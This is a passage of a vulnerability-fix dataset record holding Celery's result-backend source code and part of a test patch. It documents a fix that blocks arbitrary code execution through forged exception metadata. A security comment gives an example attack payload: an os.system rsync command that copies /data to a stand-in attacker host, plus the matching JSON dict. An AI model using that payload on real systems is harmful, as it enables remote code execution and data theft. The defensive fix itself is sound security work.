            "            **callback",
            "        })",
            "        try:",
            "            self._call_task_errbacks(fake_request, exc, None)",
            "        except Exception as eb_exc:  # pylint: disable=broad-except",
            "            return backend.fail_from_current_stack(callback.id, exc=eb_exc)",
            "        else:",
            "            return backend.fail_from_current_stack(callback.id, exc=exc)",
            "",
            "    def fail_from_current_stack(self, task_id, exc=None):",
            "        type_, real_exc, tb = sys.exc_info()",
            "        try:",
            "            exc = real_exc if exc is None else exc",
            "            exception_info = ExceptionInfo((type_, exc, tb))",
            "            self.mark_as_failure(task_id, exc, exception_info.traceback)",
            "            return exception_info",
            "        finally:",
            "            while tb is not None:",
            "                try:",
            "                    tb.tb_frame.clear()",
            "                    tb.tb_frame.f_locals",
            "                except RuntimeError:",
            "                    # Ignore the exception raised if the frame is still executing.",
            "                    pass",
            "                tb = tb.tb_next",
            "",
            "            del tb",
            "",
            "    def prepare_exception(self, exc, serializer=None):",
            "        \"\"\"Prepare exception for serialization.\"\"\"",
            "        serializer = self.serializer if serializer is None else serializer",
            "        if serializer in EXCEPTION_ABLE_CODECS:",
            "            return get_pickleable_exception(exc)",
            "        exctype = type(exc)",
            "        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),",
            "                'exc_message': ensure_serializable(exc.args, self.encode),",
            "                'exc_module': exctype.__module__}",
            "",
            "    def exception_to_python(self, exc):",
            "        \"\"\"Convert serialized exception to Python exception.\"\"\"",
            "        if not exc:",
            "            return None",
            "        elif isinstance(exc, BaseException):",
            "            if self.serializer in EXCEPTION_ABLE_CODECS:",
            "                exc = get_pickled_exception(exc)",
            "            return exc",
            "        elif not isinstance(exc, dict):",
            "            try:",
            "                exc = dict(exc)",
            "            except TypeError as e:",
            "                raise TypeError(f\"If the stored exception isn't an \"",
            "                                f\"instance of \"",
            "                                f\"BaseException, it must be a dictionary.\\n\"",
            "                                f\"Instead got: {exc}\") from e",
            "",
            "        exc_module = exc.get('exc_module')",
            "        try:",
            "            exc_type = exc['exc_type']",
            "        except KeyError as e:",
            "            raise ValueError(\"Exception information must include\"",
            "                             \"the exception type\") from e",
            "        if exc_module is None:",
            "            cls = create_exception_cls(",
            "                exc_type, __name__)",
            "        else:",
            "            try:",
            "                # Load module and find exception class in that",
            "                cls = sys.modules[exc_module]",
            "                # The type can contain qualified name with parent classes",
            "                for name in exc_type.split('.'):",
            "                    cls = getattr(cls, name)",
            "            except (KeyError, AttributeError):",
            "                cls = create_exception_cls(exc_type,",
            "                                           celery.exceptions.__name__)",
            "        exc_msg = exc.get('exc_message', '')",
            "",
            "        # If the recreated exception type isn't indeed an exception,",
            "        # this is a security issue. Without the condition below, an attacker",
            "        # could exploit a stored command vulnerability to execute arbitrary",
            "        # python code such as:",
            "        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")",
            "        # The attacker sets the task's result to a failure in the result",
            "        # backend with the os as the module, the system function as the",
            "        # exception type and the payload",
            "        # rsync /data attacker@192.168.56.100:~/data",
            "        # as the exception arguments like so:",
            "        # {",
            "        #   \"exc_module\": \"os\",",
            "        #   \"exc_type\": \"system\",",
            "        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"",
            "        # }",
            "        if not isinstance(cls, type) or not issubclass(cls, BaseException):",
            "            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'",
            "            raise SecurityError(",
            "                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")",
            "",
            "        # XXX: Without verifying `cls` is actually an exception class,",
            "        #      an attacker could execute arbitrary python code.",
            "        #      cls could be anything, even eval().",
            "        try:",
            "            if isinstance(exc_msg, (tuple, list)):",
            "                exc = cls(*exc_msg)",
            "            else:",
            "                exc = cls(exc_msg)",
            "        except Exception as err:  # noqa",
            "            exc = Exception(f'{cls}({exc_msg})')",
            "",
            "        return exc",
            "",
            "    def prepare_value(self, result):",
            "        \"\"\"Prepare value for storage.\"\"\"",
            "        if self.serializer != 'pickle' and isinstance(result, ResultBase):",
            "            return result.as_tuple()",
            "        return result",
            "",
            "    def encode(self, data):",
            "        _, _, payload = self._encode(data)",
            "        return payload",
            "",
            "    def _encode(self, data):",
            "        return dumps(data, serializer=self.serializer)",
            "",
            "    def meta_from_decoded(self, meta):",
            "        if meta['status'] in self.EXCEPTION_STATES:",
            "            meta['result'] = self.exception_to_python(meta['result'])",
            "        return meta",
            "",
            "    def decode_result(self, payload):",
            "        return self.meta_from_decoded(self.decode(payload))",
            "",
            "    def decode(self, payload):",
            "        if payload is None:",
            "            return payload",
            "        payload = payload or str(payload)",
            "        return loads(payload,",
            "                     content_type=self.content_type,",
            "                     content_encoding=self.content_encoding,",
            "                     accept=self.accept)",
            "",
            "    def prepare_expires(self, value, type=None):",
            "        if value is None:",
            "            value = self.app.conf.result_expires",
            "        if isinstance(value, timedelta):",
            "            value = value.total_seconds()",
            "        if value is not None and type:",
            "            return type(value)",
            "        return value",
            "",
            "    def prepare_persistent(self, enabled=None):",
            "        if enabled is not None:",
            "            return enabled",
            "        persistent = self.app.conf.result_persistent",
            "        return self.persistent if persistent is None else persistent",
            "",
            "    def encode_result(self, result, state):",
            "        if state in self.EXCEPTION_STATES and isinstance(result, Exception):",
            "            return self.prepare_exception(result)",
            "        return self.prepare_value(result)",
            "",
            "    def is_cached(self, task_id):",
            "        return task_id in self._cache",
            "",
            "    def _get_result_meta(self, result,",
            "                         state, traceback, request, format_date=True,",
            "                         encode=False):",
            "        if state in self.READY_STATES:",
            "            date_done = datetime.utcnow()",
            "            if format_date:",
            "                date_done = date_done.isoformat()",
            "        else:",
            "            date_done = None",
            "",
            "        meta = {",
            "            'status': state,",
            "            'result': result,",
            "            'traceback': traceback,",
            "            'children': self.current_task_children(request),",
            "            'date_done': date_done,",
            "        }",
            "",
            "        if request and getattr(request, 'group', None):",
            "            meta['group_id'] = request.group",
            "        if request and getattr(request, 'parent_id', None):",
            "            meta['parent_id'] = request.parent_id",
            "",
            "        if self.app.conf.find_value_for_key('extended', 'result'):",
            "            if request:",
            "                request_meta = {",
            "                    'name': getattr(request, 'task', None),",
            "                    'args': getattr(request, 'args', None),",
            "                    'kwargs': getattr(request, 'kwargs', None),",
            "                    'worker': getattr(request, 'hostname', None),",
            "                    'retries': getattr(request, 'retries', None),",
            "                    'queue': request.delivery_info.get('routing_key')",
            "                    if hasattr(request, 'delivery_info') and",
            "                    request.delivery_info else None",
            "                }",
            "",
            "                if encode:",
            "                    # args and kwargs need to be encoded properly before saving",
            "                    encode_needed_fields = {\"args\", \"kwargs\"}",
            "                    for field in encode_needed_fields:",
            "                        value = request_meta[field]",
            "                        encoded_value = self.encode(value)",
            "                        request_meta[field] = ensure_bytes(encoded_value)",
            "",
            "                meta.update(request_meta)",
            "",
            "        return meta",
            "",
            "    def _sleep(self, amount):",
            "        time.sleep(amount)",
            "",
            "    def store_result(self, task_id, result, state,",
            "                     traceback=None, request=None, **kwargs):",
            "        \"\"\"Update task state and result.",
            "",
            "        if always_retry_backend_operation is activated, in the event of a recoverable exception,",
            "        then retry operation with an exponential backoff until a limit has been reached.",
            "        \"\"\"",
            "        result = self.encode_result(result, state)",
            "",
            "        retries = 0",
            "",
            "        while True:",
            "            try:",
            "                self._store_result(task_id, result, state, traceback,",
            "                                   request=request, **kwargs)",
            "                return result",
            "            except Exception as exc:",
            "                if self.always_retry and self.exception_safe_to_retry(exc):",
            "                    if retries < self.max_retries:",
            "                        retries += 1",
            "",
            "                        # get_exponential_backoff_interval computes integers",
            "                        # and time.sleep accept floats for sub second sleep",
            "                        sleep_amount = get_exponential_backoff_interval(",
            "                            self.base_sleep_between_retries_ms, retries,",
            "                            self.max_sleep_between_retries_ms, True) / 1000",
            "                        self._sleep(sleep_amount)",
            "                    else:",
            "                        raise_with_context(",
            "                            BackendStoreError(\"failed to store result on the backend\", task_id=task_id, state=state),",
            "                        )",
            "                else:",
            "                    raise",
            "",
            "    def forget(self, task_id):",
            "        self._cache.pop(task_id, None)",
            "        self._forget(task_id)",
            "",
            "    def _forget(self, task_id):",
            "        raise NotImplementedError('backend does not implement forget.')",
            "",
            "    def get_state(self, task_id):",
            "        \"\"\"Get the state of a task.\"\"\"",
            "        return self.get_task_meta(task_id)['status']",
            "",
            "    get_status = get_state  # XXX compat",
            "",
            "    def get_traceback(self, task_id):",
            "        \"\"\"Get the traceback for a failed task.\"\"\"",
            "        return self.get_task_meta(task_id).get('traceback')",
            "",
            "    def get_result(self, task_id):",
            "        \"\"\"Get the result of a task.\"\"\"",
            "        return self.get_task_meta(task_id).get('result')",
            "",
            "    def get_children(self, task_id):",
            "        \"\"\"Get the list of subtasks sent by a task.\"\"\"",
            "        try:",
            "            return self.get_task_meta(task_id)['children']",
            "        except KeyError:",
            "            pass",
            "",
            "    def _ensure_not_eager(self):",
            "        if self.app.conf.task_always_eager:",
            "            warnings.warn(",
            "                \"Shouldn't retrieve result with task_always_eager enabled.\",",
            "                RuntimeWarning",
            "            )",
            "",
            "    def exception_safe_to_retry(self, exc):",
            "        \"\"\"Check if an exception is safe to retry.",
            "",
            "        Backends have to overload this method with correct predicates dealing with their exceptions.",
            "",
            "        By default no exception is safe to retry, it's up to backend implementation",
            "        to define which exceptions are safe.",
            "        \"\"\"",
            "        return False",
            "",
            "    def get_task_meta(self, task_id, cache=True):",
            "        \"\"\"Get task meta from backend.",
            "",
            "        if always_retry_backend_operation is activated, in the event of a recoverable exception,",
            "        then retry operation with an exponential backoff until a limit has been reached.",
            "        \"\"\"",
            "        self._ensure_not_eager()",
            "        if cache:",
            "            try:",
            "                return self._cache[task_id]",
            "            except KeyError:",
            "                pass",
            "        retries = 0",
            "        while True:",
            "            try:",
            "                meta = self._get_task_meta_for(task_id)",
            "                break",
            "            except Exception as exc:",
            "                if self.always_retry and self.exception_safe_to_retry(exc):",
            "                    if retries < self.max_retries:",
            "                        retries += 1",
            "",
            "                        # get_exponential_backoff_interval computes integers",
            "                        # and time.sleep accept floats for sub second sleep",
            "                        sleep_amount = get_exponential_backoff_interval(",
            "                            self.base_sleep_between_retries_ms, retries,",
            "                            self.max_sleep_between_retries_ms, True) / 1000",
            "                        self._sleep(sleep_amount)",
            "                    else:",
            "                        raise_with_context(",
            "                            BackendGetMetaError(\"failed to get meta\", task_id=task_id),",
            "                        )",
            "                else:",
            "                    raise",
            "",
            "        if cache and meta.get('status') == states.SUCCESS:",
            "            self._cache[task_id] = meta",
            "        return meta",
            "",
            "    def reload_task_result(self, task_id):",
            "        \"\"\"Reload task result, even if it has been previously fetched.\"\"\"",
            "        self._cache[task_id] = self.get_task_meta(task_id, cache=False)",
            "",
            "    def reload_group_result(self, group_id):",
            "        \"\"\"Reload group result, even if it has been previously fetched.\"\"\"",
            "        self._cache[group_id] = self.get_group_meta(group_id, cache=False)",
            "",
            "    def get_group_meta(self, group_id, cache=True):",
            "        self._ensure_not_eager()",
            "        if cache:",
            "            try:",
            "                return self._cache[group_id]",
            "            except KeyError:",
            "                pass",
            "",
            "        meta = self._restore_group(group_id)",
            "        if cache and meta is not None:",
            "            self._cache[group_id] = meta",
            "        return meta",
            "",
            "    def restore_group(self, group_id, cache=True):",
            "        \"\"\"Get the result for a group.\"\"\"",
            "        meta = self.get_group_meta(group_id, cache=cache)",
            "        if meta:",
            "            return meta['result']",
            "",
            "    def save_group(self, group_id, result):",
            "        \"\"\"Store the result of an executed group.\"\"\"",
            "        return self._save_group(group_id, result)",
            "",
            "    def delete_group(self, group_id):",
            "        self._cache.pop(group_id, None)",
            "        return self._delete_group(group_id)",
            "",
            "    def cleanup(self):",
            "        \"\"\"Backend cleanup.\"\"\"",
            "",
            "    def process_cleanup(self):",
            "        \"\"\"Cleanup actions to do at the end of a task worker process.\"\"\"",
            "",
            "    def on_task_call(self, producer, task_id):",
            "        return {}",
            "",
            "    def add_to_chord(self, chord_id, result):",
            "        raise NotImplementedError('Backend does not support add_to_chord')",
            "",
            "    def on_chord_part_return(self, request, state, result, **kwargs):",
            "        pass",
            "",
            "    def set_chord_size(self, group_id, chord_size):",
            "        pass",
            "",
            "    def fallback_chord_unlock(self, header_result, body, countdown=1,",
            "                              **kwargs):",
            "        kwargs['result'] = [r.as_tuple() for r in header_result]",
            "        try:",
            "            body_type = getattr(body, 'type', None)",
            "        except NotRegistered:",
            "            body_type = None",
            "",
            "        queue = body.options.get('queue', getattr(body_type, 'queue', None))",
            "",
            "        if queue is None:",
            "            # fallback to default routing if queue name was not",
            "            # explicitly passed to body callback",
            "            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name",
            "",
            "        priority = body.options.get('priority', getattr(body_type, 'priority', 0))",
            "        self.app.tasks['celery.chord_unlock'].apply_async(",
            "            (header_result.id, body,), kwargs,",
            "            countdown=countdown,",
            "            queue=queue,",
            "            priority=priority,",
            "        )",
            "",
            "    def ensure_chords_allowed(self):",
            "        pass",
            "",
            "    def apply_chord(self, header_result_args, body, **kwargs):",
            "        self.ensure_chords_allowed()",
            "        header_result = self.app.GroupResult(*header_result_args)",
            "        self.fallback_chord_unlock(header_result, body, **kwargs)",
            "",
            "    def current_task_children(self, request=None):",
            "        request = request or getattr(get_current_task(), 'request', None)",
            "        if request:",
            "            return [r.as_tuple() for r in getattr(request, 'children', [])]",
            "",
            "    def __reduce__(self, args=(), kwargs=None):",
            "        kwargs = {} if not kwargs else kwargs",
            "        return (unpickle_backend, (self.__class__, args, kwargs))",
            "",
            "",
            "class SyncBackendMixin:",
            "    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,",
            "                    on_message=None, on_interval=None):",
            "        self._ensure_not_eager()",
            "        results = result.results",
            "        if not results:",
            "            return",
            "",
            "        task_ids = set()",
            "        for result in results:",
            "            if isinstance(result, ResultSet):",
            "                yield result.id, result.results",
            "            else:",
            "                task_ids.add(result.id)",
            "",
            "        yield from self.get_many(",
            "            task_ids,",
            "            timeout=timeout, interval=interval, no_ack=no_ack,",
            "            on_message=on_message, on_interval=on_interval,",
            "        )",
            "",
            "    def wait_for_pending(self, result, timeout=None, interval=0.5,",
            "                         no_ack=True, on_message=None, on_interval=None,",
            "                         callback=None, propagate=True):",
            "        self._ensure_not_eager()",
            "        if on_message is not None:",
            "            raise ImproperlyConfigured(",
            "                'Backend does not support on_message callback')",
            "",
            "        meta = self.wait_for(",
            "            result.id, timeout=timeout,",
            "            interval=interval,",
            "            on_interval=on_interval,",
            "            no_ack=no_ack,",
            "        )",
            "        if meta:",
            "            result._maybe_set_cache(meta)",
            "            return result.maybe_throw(propagate=propagate, callback=callback)",
            "",
            "    def wait_for(self, task_id,",
            "                 timeout=None, interval=0.5, no_ack=True, on_interval=None):",
            "        \"\"\"Wait for task and return its result.",
            "",
            "        If the task raises an exception, this exception",
            "        will be re-raised by :func:`wait_for`.",
            "",
            "        Raises:",
            "            celery.exceptions.TimeoutError:",
            "                If `timeout` is not :const:`None`, and the operation",
            "                takes longer than `timeout` seconds.",
            "        \"\"\"",
            "        self._ensure_not_eager()",
            "",
            "        time_elapsed = 0.0",
            "",
            "        while 1:",
            "            meta = self.get_task_meta(task_id)",
            "            if meta['status'] in states.READY_STATES:",
            "                return meta",
            "            if on_interval:",
            "                on_interval()",
            "            # avoid hammering the CPU checking status.",
            "            time.sleep(interval)",
            "            time_elapsed += interval",
            "            if timeout and time_elapsed >= timeout:",
            "                raise TimeoutError('The operation timed out.')",
            "",
            "    def add_pending_result(self, result, weak=False):",
            "        return result",
            "",
            "    def remove_pending_result(self, result):",
            "        return result",
            "",
            "    @property",
            "    def is_async(self):",
            "        return False",
            "",
            "",
            "class BaseBackend(Backend, SyncBackendMixin):",
            "    \"\"\"Base (synchronous) result backend.\"\"\"",
            "",
            "",
            "BaseDictBackend = BaseBackend  # XXX compat",
            "",
            "",
            "class BaseKeyValueStoreBackend(Backend):",
            "    key_t = ensure_bytes",
            "    task_keyprefix = 'celery-task-meta-'",
            "    group_keyprefix = 'celery-taskset-meta-'",
            "    chord_keyprefix = 'chord-unlock-'",
            "    implements_incr = False",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        if hasattr(self.key_t, '__func__'):  # pragma: no cover",
            "            self.key_t = self.key_t.__func__  # remove binding",
            "        self._encode_prefixes()",
            "        super().__init__(*args, **kwargs)",
            "        if self.implements_incr:",
            "            self.apply_chord = self._apply_chord_incr",
            "",
            "    def _encode_prefixes(self):",
            "        self.task_keyprefix = self.key_t(self.task_keyprefix)",
            "        self.group_keyprefix = self.key_t(self.group_keyprefix)",
            "        self.chord_keyprefix = self.key_t(self.chord_keyprefix)",
            "",
            "    def get(self, key):",
            "        raise NotImplementedError('Must implement the get method.')",
            "",
            "    def mget(self, keys):",
            "        raise NotImplementedError('Does not support get_many')",
            "",
            "    def _set_with_state(self, key, value, state):",
            "        return self.set(key, value)",
            "",
            "    def set(self, key, value):",
            "        raise NotImplementedError('Must implement the set method.')",
            "",
            "    def delete(self, key):",
            "        raise NotImplementedError('Must implement the delete method')",
            "",
            "    def incr(self, key):",
            "        raise NotImplementedError('Does not implement incr')",
            "",
            "    def expire(self, key, value):",
            "        pass",
            "",
            "    def get_key_for_task(self, task_id, key=''):",
            "        \"\"\"Get the cache key for a task by id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.task_keyprefix, key_t(task_id), key_t(key),",
            "        ])",
            "",
            "    def get_key_for_group(self, group_id, key=''):",
            "        \"\"\"Get the cache key for a group by id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.group_keyprefix, key_t(group_id), key_t(key),",
            "        ])",
            "",
            "    def get_key_for_chord(self, group_id, key=''):",
            "        \"\"\"Get the cache key for the chord waiting on group with given id.\"\"\"",
            "        key_t = self.key_t",
            "        return key_t('').join([",
            "            self.chord_keyprefix, key_t(group_id), key_t(key),",
            "        ])",
            "",
            "    def _strip_prefix(self, key):",
            "        \"\"\"Take bytes: emit string.\"\"\"",
            "        key = self.key_t(key)",
            "        for prefix in self.task_keyprefix, self.group_keyprefix:",
            "            if key.startswith(prefix):",
            "                return bytes_to_str(key[len(prefix):])",
            "        return bytes_to_str(key)",
            "",
            "    def _filter_ready(self, values, READY_STATES=states.READY_STATES):",
            "        for k, value in values:",
            "            if value is not None:",
            "                value = self.decode_result(value)",
            "                if value['status'] in READY_STATES:",
            "                    yield k, value",
            "",
            "    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):",
            "        if hasattr(values, 'items'):",
            "            # client returns dict so mapping preserved.",
            "            return {",
            "                self._strip_prefix(k): v",
            "                for k, v in self._filter_ready(values.items(), READY_STATES)",
            "            }",
            "        else:",
            "            # client returns list so need to recreate mapping.",
            "            return {",
            "                bytes_to_str(keys[i]): v",
            "                for i, v in self._filter_ready(enumerate(values), READY_STATES)",
            "            }",
            "",
            "    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,",
            "                 on_message=None, on_interval=None, max_iterations=None,",
            "                 READY_STATES=states.READY_STATES):",
            "        interval = 0.5 if interval is None else interval",
            "        ids = task_ids if isinstance(task_ids, set) else set(task_ids)",
            "        cached_ids = set()",
            "        cache = self._cache",
            "        for task_id in ids:",
            "            try:",
            "                cached = cache[task_id]",
            "            except KeyError:",
            "                pass",
            "            else:",
            "                if cached['status'] in READY_STATES:",
            "                    yield bytes_to_str(task_id), cached",
            "                    cached_ids.add(task_id)",
            "",
            "        ids.difference_update(cached_ids)",
            "        iterations = 0",
            "        while ids:",
            "            keys = list(ids)",
            "            r = self._mget_to_results(self.mget([self.get_key_for_task(k)",
            "                                                 for k in keys]), keys, READY_STATES)",
            "            cache.update(r)",
            "            ids.difference_update({bytes_to_str(v) for v in r})",
            "            for key, value in r.items():",
            "                if on_message is not None:",
            "                    on_message(value)",
            "                yield bytes_to_str(key), value",
            "            if timeout and iterations * interval >= timeout:",
            "                raise TimeoutError(f'Operation timed out ({timeout})')",
            "            if on_interval:",
            "                on_interval()",
            "            time.sleep(interval)  # don't busy loop.",
            "            iterations += 1",
            "            if max_iterations and iterations >= max_iterations:",
            "                break",
            "",
            "    def _forget(self, task_id):",
            "        self.delete(self.get_key_for_task(task_id))",
            "",
            "    def _store_result(self, task_id, result, state,",
            "                      traceback=None, request=None, **kwargs):",
            "        meta = self._get_result_meta(result=result, state=state,",
            "                                     traceback=traceback, request=request)",
            "        meta['task_id'] = bytes_to_str(task_id)",
            "",
            "        # Retrieve metadata from the backend, if the status",
            "        # is a success then we ignore any following update to the state.",
            "        # This solves a task deduplication issue because of network",
            "        # partitioning or lost workers. This issue involved a race condition",
            "        # making a lost task overwrite the last successful result in the",
            "        # result backend.",
            "        current_meta = self._get_task_meta_for(task_id)",
            "",
            "        if current_meta['status'] == states.SUCCESS:",
            "            return result",
            "",
            "        try:",
            "            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)",
            "        except BackendStoreError as ex:",
            "            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex",
            "",
            "        return result",
            "",
            "    def _save_group(self, group_id, result):",
            "        self._set_with_state(self.get_key_for_group(group_id),",
            "                             self.encode({'result': result.as_tuple()}), states.SUCCESS)",
            "        return result",
            "",
            "    def _delete_group(self, group_id):",
            "        self.delete(self.get_key_for_group(group_id))",
            "",
            "    def _get_task_meta_for(self, task_id):",
            "        \"\"\"Get task meta-data for a task by id.\"\"\"",
            "        meta = self.get(self.get_key_for_task(task_id))",
            "        if not meta:",
            "            return {'status': states.PENDING, 'result': None}",
            "        return self.decode_result(meta)",
            "",
            "    def _restore_group(self, group_id):",
            "        \"\"\"Get task meta-data for a task by id.\"\"\"",
            "        meta = self.get(self.get_key_for_group(group_id))",
            "        # previously this was always pickled, but later this",
            "        # was extended to support other serializers, so the",
            "        # structure is kind of weird.",
            "        if meta:",
            "            meta = self.decode(meta)",
            "            result = meta['result']",
            "            meta['result'] = result_from_tuple(result, self.app)",
            "            return meta",
            "",
            "    def _apply_chord_incr(self, header_result_args, body, **kwargs):",
            "        self.ensure_chords_allowed()",
            "        header_result = self.app.GroupResult(*header_result_args)",
            "        header_result.save(backend=self)",
            "",
            "    def on_chord_part_return(self, request, state, result, **kwargs):",
            "        if not self.implements_incr:",
            "            return",
            "        app = self.app",
            "        gid = request.group",
            "        if not gid:",
            "            return",
            "        key = self.get_key_for_chord(gid)",
            "        try:",
            "            deps = GroupResult.restore(gid, backend=self)",
            "        except Exception as exc:  # pylint: disable=broad-except",
            "            callback = maybe_signature(request.chord, app=app)",
            "            logger.exception('Chord %r raised: %r', gid, exc)",
            "            return self.chord_error_from_stack(",
            "                callback,",
            "                ChordError(f'Cannot restore group: {exc!r}'),",
            "            )",
            "        if deps is None:",
            "            try:",
            "                raise ValueError(gid)",
            "            except ValueError as exc:",
            "                callback = maybe_signature(request.chord, app=app)",
            "                logger.exception('Chord callback %r raised: %r', gid, exc)",
            "                return self.chord_error_from_stack(",
            "                    callback,",
            "                    ChordError(f'GroupResult {gid} no longer exists'),",
            "                )",
            "        val = self.incr(key)",
            "        # Set the chord size to the value defined in the request, or fall back",
            "        # to the number of dependencies we can see from the restored result",
            "        size = request.chord.get(\"chord_size\")",
            "        if size is None:",
            "            size = len(deps)",
            "        if val > size:  # pragma: no cover",
            "            logger.warning('Chord counter incremented too many times for %r',",
            "                           gid)",
            "        elif val == size:",
            "            callback = maybe_signature(request.chord, app=app)",
            "            j = deps.join_native if deps.supports_native_join else deps.join",
            "            try:",
            "                with allow_join_result():",
            "                    ret = j(",
            "                        timeout=app.conf.result_chord_join_timeout,",
            "                        propagate=True)",
            "            except Exception as exc:  # pylint: disable=broad-except",
            "                try:",
            "                    culprit = next(deps._failed_join_report())",
            "                    reason = 'Dependency {0.id} raised {1!r}'.format(",
            "                        culprit, exc,",
            "                    )",
            "                except StopIteration:",
            "                    reason = repr(exc)",
            "",
            "                logger.exception('Chord %r raised: %r', gid, reason)",
            "                self.chord_error_from_stack(callback, ChordError(reason))",
            "            else:",
            "                try:",
            "                    callback.delay(ret)",
            "                except Exception as exc:  # pylint: disable=broad-except",
            "                    logger.exception('Chord %r raised: %r', gid, exc)",
            "                    self.chord_error_from_stack(",
            "                        callback,",
            "                        ChordError(f'Callback error: {exc!r}'),",
            "                    )",
            "            finally:",
            "                deps.delete()",
            "                self.client.delete(key)",
            "        else:",
            "            self.expire(key, self.expires)",
            "",
            "",
            "class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):",
            "    \"\"\"Result backend base class for key/value stores.\"\"\"",
            "",
            "",
            "class DisabledBackend(BaseBackend):",
            "    \"\"\"Dummy result backend.\"\"\"",
            "",
            "    _cache = {}  # need this attribute to reset cache in tests.",
            "",
            "    def store_result(self, *args, **kwargs):",
            "        pass",
            "",
            "    def ensure_chords_allowed(self):",
            "        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())",
            "",
            "    def _is_disabled(self, *args, **kwargs):",
            "        raise NotImplementedError(E_NO_BACKEND.strip())",
            "",
            "    def as_uri(self, *args, **kwargs):",
            "        return 'disabled://'",
            "",
            "    get_state = get_status = get_result = get_traceback = _is_disabled",
            "    get_task_meta_for = wait_for = get_many = _is_disabled"
        ],
        "action": [
            "0",
            "0",
            "0",
            "2",
            "2",
            "2",
            "0",
            "0",
            "0",
            "0",
            "0",
            "0",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "0",
            "0",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "0",
            "0",
            "0"
        ],
        "dele_reviseLocation": {
            "28": [],
            "341": [
                "Backend",
                "exception_to_python"
            ],
            "342": [
                "Backend",
                "exception_to_python"
            ],
            "343": [
                "Backend",
                "exception_to_python"
            ],
            "344": [
                "Backend",
                "exception_to_python"
            ],
            "345": [
                "Backend",
                "exception_to_python"
            ],
            "346": [
                "Backend",
                "exception_to_python"
            ],
            "347": [
                "Backend",
                "exception_to_python"
            ],
            "348": [
                "Backend",
                "exception_to_python"
            ],
            "349": [
                "Backend",
                "exception_to_python"
            ],
            "350": [
                "Backend",
                "exception_to_python"
            ],
            "351": [
                "Backend",
                "exception_to_python"
            ],
            "352": [
                "Backend",
                "exception_to_python"
            ],
            "353": [
                "Backend",
                "exception_to_python"
            ],
            "354": [
                "Backend",
                "exception_to_python"
            ],
            "355": [
                "Backend",
                "exception_to_python"
            ],
            "356": [
                "Backend",
                "exception_to_python"
            ],
            "357": [
                "Backend",
                "exception_to_python"
            ],
            "358": [
                "Backend",
                "exception_to_python"
            ],
            "359": [
                "Backend",
                "exception_to_python"
            ],
            "360": [
                "Backend",
                "exception_to_python"
            ],
            "361": [
                "Backend",
                "exception_to_python"
            ],
            "362": [
                "Backend",
                "exception_to_python"
            ],
            "363": [
                "Backend",
                "exception_to_python"
            ],
            "364": [
                "Backend",
                "exception_to_python"
            ],
            "365": [
                "Backend",
                "exception_to_python"
            ],
            "366": [
                "Backend",
                "exception_to_python"
            ]
        },
        "addLocation": []
    },
    "t/unit/backends/test_base.py": {
        "Patch": {
            "0": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 1,
                "PatchRowcode": "+import re"
            },
            "1": {
                "beforePatchRowNumber": 1,
                "afterPatchRowNumber": 2,
                "PatchRowcode": " from contextlib import contextmanager"
            },
            "2": {
                "beforePatchRowNumber": 2,
                "afterPatchRowNumber": 3,
                "PatchRowcode": " from unittest.mock import ANY, MagicMock, Mock, call, patch, sentinel"
            },
            "3": {
                "beforePatchRowNumber": 3,
                "afterPatchRowNumber": 4,
                "PatchRowcode": " "
            },
            "4": {
                "beforePatchRowNumber": 11,
                "afterPatchRowNumber": 12,
                "PatchRowcode": " from celery.backends.base import (BaseBackend, DisabledBackend,"
            },
            "5": {
                "beforePatchRowNumber": 12,
                "afterPatchRowNumber": 13,
                "PatchRowcode": "                                   KeyValueStoreBackend, _nulldict)"
            },
            "6": {
                "beforePatchRowNumber": 13,
                "afterPatchRowNumber": 14,
                "PatchRowcode": " from celery.exceptions import (BackendGetMetaError, BackendStoreError,"
            },
            "7": {
                "beforePatchRowNumber": 14,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                               ChordError, TimeoutError)"
            },
            "8": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 15,
                "PatchRowcode": "+                               ChordError, SecurityError, TimeoutError)"
            },
            "9": {
                "beforePatchRowNumber": 15,
                "afterPatchRowNumber": 16,
                "PatchRowcode": " from celery.result import result_from_tuple"
            },
            "10": {
                "beforePatchRowNumber": 16,
                "afterPatchRowNumber": 17,
                "PatchRowcode": " from celery.utils import serialization"
            },
            "11": {
                "beforePatchRowNumber": 17,
                "afterPatchRowNumber": 18,
                "PatchRowcode": " from celery.utils.functional import pass1"
            },
            "12": {
                "beforePatchRowNumber": 581,
                "afterPatchRowNumber": 582,
                "PatchRowcode": "         b = BaseBackend(app=self.app)"
            },
            "13": {
                "beforePatchRowNumber": 582,
                "afterPatchRowNumber": 583,
                "PatchRowcode": "         assert b.exception_to_python(None) is None"
            },
            "14": {
                "beforePatchRowNumber": 583,
                "afterPatchRowNumber": 584,
